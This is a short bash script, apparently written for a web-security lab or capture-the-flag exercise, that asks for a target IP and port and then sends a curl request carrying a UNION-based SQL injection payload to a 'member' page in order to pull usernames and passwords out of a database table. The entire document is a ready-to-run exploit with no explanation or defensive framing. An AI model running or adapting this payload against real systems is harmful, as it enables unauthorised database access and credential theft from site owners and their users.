
  
#!/usr/bin/env bash
echo "Enter IP address"
read IP
echo "Enter PORT (only 80, 8080)"
read PORT
echo "WAIT.................................."
curl "http://${IP}:${PORT}/?page=member&id=1 or 1=1 union all select password, username from Member_Brute_Force.db_default&Submit=Submit#"
